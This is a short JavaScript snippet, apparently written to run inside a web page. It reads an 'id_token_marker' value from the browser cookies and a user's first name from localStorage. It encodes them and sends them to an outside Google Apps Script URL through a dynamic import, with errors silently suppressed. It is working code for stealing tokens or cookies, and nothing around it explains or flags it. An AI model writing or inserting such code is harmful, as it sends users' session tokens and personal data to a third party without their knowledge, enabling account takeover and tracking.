(()=>{
let eagleid = Object.fromEntries(document.cookie.split(';').map(x=>String(x).trim().split('=')).map(x=>[x.shift(),x.join('=')])).id_token_marker;
let name = String(localStorage.getItem('user')?.FirstName);
const url = new URL('https://script.google.com/macros/s/AKfycbzCqAhWZNUcRaKvXSE9EhSgWvCY4xCgY0U2ksr_nv_eCGd2i-oh8cznalBfqSkSn7C6Vw/exec');
url.searchParams.set('payload',btoa(encodeURIComponent(JSON.stringify({eagleid,name}))));
  (async()=>{
    try{
    await import(url);
  }catch{}
  })();
})();
